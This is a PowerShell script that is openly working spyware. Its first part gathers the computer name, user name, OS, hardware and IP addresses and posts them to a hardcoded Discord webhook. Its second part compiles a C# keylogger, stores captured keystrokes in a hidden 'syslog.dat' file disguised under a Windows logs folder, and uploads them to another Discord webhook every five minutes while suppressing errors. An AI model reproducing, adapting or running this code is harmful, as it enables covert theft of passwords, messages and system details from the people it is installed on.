# === Part 1: Send system info to Discord webhook ===

$infoWebhookUrl = "https://discord.com/api/webhooks/1393268541138010273/_XvoosQeG3JRaRI7XZ5LjbpQ4EKoD8SyDovgLw2fgC47jkh1Tjj9NeAKhnMNxDfT5Jye"

$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$os = Get-CimInstance Win32_OperatingSystem
$osVersion = $os.Caption + " " + $os.Version
$systemModel = (Get-CimInstance Win32_ComputerSystem).Model
$manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
$processor = (Get-CimInstance Win32_Processor).Name
$ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$ipAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", "
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeFormatted = ((Get-Date) - $uptime).ToString("dd\.hh\:mm\:ss")
$timeStamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

$body = @{
    username = "InfoBot"
    content = ""
    embeds = @(
        @{
            title = "System Information Report"
            color = 3447003
            fields = @(
                @{ name = "Computer Name"; value = $computerName; inline = $true },
                @{ name = "User Name"; value = $userName; inline = $true },
                @{ name = "OS Version"; value = $osVersion; inline = $false },
                @{ name = "System Model"; value = $systemModel; inline = $true },
                @{ name = "Manufacturer"; value = $manufacturer; inline = $true },
                @{ name = "Processor"; value = $processor; inline = $false },
                @{ name = "RAM (GB)"; value = $ramGB; inline = $true },
                @{ name = "IPv4 Addresses"; value = $ipAddresses; inline = $false },
                @{ name = "System Uptime (dd.hh:mm:ss)"; value = $uptimeFormatted; inline = $true },
                @{ name = "Timestamp"; value = $timeStamp; inline = $false }
            )
        }
    )
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Uri $infoWebhookUrl -Method Post -Body $body -ContentType "application/json"


# === Part 2: Keylogger code with periodic Discord upload ===

$keylogWebhookUrl = "https://discord.com/api/webhooks/1393271113752252447/fODScUR4O_XMp8znE0qvnU1kmwyE-zUkHIAfoCxQrhT3XIIrP1qY1K0NQ7MW1jEFknDL"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);

    public static string CaptureKeys() {
        StringBuilder buffer = new StringBuilder();
        for (int i = 8; i <= 190; i++) {
            if ((GetAsyncKeyState(i) & 0x0001) != 0) {
                string key = ((System.Windows.Forms.Keys)i).ToString();
                switch (key) {
                    case "Space": key = " "; break;
                    case "Return": key = "[ENTER]"; break;
                    case "Back": key = "[BACKSPACE]"; break;
                    case "Tab": key = "[TAB]"; break;
                    case "Escape": key = "[ESC]"; break;
                    default:
                        if (key.Length == 1) {
                            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
                            if (!shift) key = key.ToLower();
                        }
                        break;
                }
                buffer.Append(key);
            }
        }
        return buffer.ToString();
    }
}
"@

$hiddenFolder = "$env:APPDATA\Microsoft\Windows\Logs"
if (!(Test-Path $hiddenFolder)) {
    New-Item -Path $hiddenFolder -ItemType Directory | Out-Null
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
}

$logFile = Join-Path $hiddenFolder "syslog.dat"

"[Keylogger started at $(Get-Date)]`n" | Out-File -FilePath $logFile -Encoding UTF8

$lastSend = Get-Date

while ($true) {
    Start-Sleep -Milliseconds 100

    $keys = [KeyLogger]::CaptureKeys()
    if ($keys.Length -gt 0) {
        Add-Content -Path $logFile -Value $keys
    }

    if (((Get-Date) - $lastSend).TotalMinutes -ge 5) {
        $content = Get-Content -Path $logFile -Raw
        if ($content.Trim().Length -gt 0) {
            $payload = @{
                username = "KeyloggerBot"
                content = "```\n$content\n```"
            } | ConvertTo-Json

            try {
                Invoke-RestMethod -Uri $keylogWebhookUrl -Method Post -Body $payload -ContentType "application/json"
                Clear-Content -Path $logFile
                $lastSend = Get-Date
            } catch {
                # ignore errors
            }
        }
    }
}
